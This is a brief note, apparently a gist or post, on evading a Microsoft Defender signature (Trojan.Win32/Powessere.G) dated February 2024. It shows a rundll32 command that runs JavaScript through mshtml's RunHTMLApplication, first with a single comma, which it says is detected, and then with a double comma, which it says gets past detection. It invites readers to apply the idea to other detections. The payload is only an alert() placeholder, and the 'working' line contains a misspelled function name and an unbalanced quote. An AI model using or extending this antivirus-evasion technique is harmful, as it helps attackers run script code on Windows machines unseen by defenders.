Double-comma trick to bypass Defender's `Trojan.Win32`-esque mitigations/ Tested against `Trojan.Win32/Powessere.G` as of 8 Feb 2024.

```
# Fails. Notice single comma

rundll32.exe javascript:"\..\..\mshtml,RunHTMLApplication";alert(hewwo)

# Works

rundll32.exe javascript:"\..\..\mshtml,,RunHTLMApplication;alert(heewo)
```

Try extending to other detections and playing with the basic idea.

